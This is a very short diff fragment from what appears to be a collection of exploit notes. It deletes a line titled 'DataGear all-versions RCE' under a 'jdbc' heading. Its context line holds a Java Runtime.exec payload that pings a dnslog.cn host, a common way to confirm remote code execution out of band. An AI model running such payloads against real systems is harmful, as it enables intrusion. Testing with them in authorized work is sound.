@@ -104,5 +104,5 @@ java.lang.Runtime.getRuntime().exec("ping hng2al.dnslog.cn");
 
 ^
 ## **jdbc**
-DataGear全版本RCE
+
 
